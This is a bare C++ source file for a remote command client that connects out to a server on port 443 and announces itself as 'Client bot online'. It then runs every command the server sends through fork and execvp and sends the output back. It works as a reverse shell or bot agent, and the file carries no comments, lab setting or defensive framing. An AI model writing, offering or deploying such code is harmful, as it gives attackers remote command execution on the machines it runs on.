#include <iostream>
#include <string>
#include <vector>
#include <sstream>
#include <cstring>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/wait.h>
#include <fcntl.h>

int main(int argc, char* argv[]) {
    if (argc < 2) {
        std::cerr << "Usage: " << argv[0] << " <server_ip>\n";
        return 1;
    }

    const char* serverName = argv[1];
    int serverPort = 443;
    int sock = socket(AF_INET, SOCK_STREAM, 0);

    if (sock < 0) {
        perror("Socket creation failed");
        return 1;
    }

    sockaddr_in serverAddr{};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(serverPort);
    inet_pton(AF_INET, serverName, &serverAddr.sin_addr);

    if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
        perror("Connection failed");
        close(sock);
        return 1;
    }

    std::string greeting = "Client bot online";
    send(sock, greeting.c_str(), greeting.length(), 0);

    char buffer[4064];
    ssize_t bytesReceived = recv(sock, buffer, sizeof(buffer) - 1, 0);
    buffer[bytesReceived] = '\0';
    std::string command(buffer);

    while (command != "exit") {
        std::vector<char*> args;
        std::istringstream iss(command);
        std::string token;
        while (iss >> token) {
            char* arg = new char[token.size() + 1];
            std::strcpy(arg, token.c_str());
            args.push_back(arg);
        }
        args.push_back(nullptr);

        int pipefd[2];
        pipe(pipefd);

        pid_t pid = fork();
        if (pid == 0) {
            close(pipefd[0]);
            dup2(pipefd[1], STDOUT_FILENO);
            dup2(pipefd[1], STDERR_FILENO);
            close(pipefd[1]);
            execvp(args[0], args.data());
            perror("execvp failed");
            exit(1);
        } else {
            close(pipefd[1]);
            char result[4096];
            ssize_t n = read(pipefd[0], result, sizeof(result) - 1);
            result[n] = '\0';
            send(sock, result, n, 0);
            close(pipefd[0]);
            waitpid(pid, nullptr, 0);
        }

        for (char* arg : args) {
            delete[] arg;
        }

        bytesReceived = recv(sock, buffer, sizeof(buffer) - 1, 0);
        buffer[bytesReceived] = '\0';
        command = std::string(buffer);
    }

    close(sock);
    return 0;
}
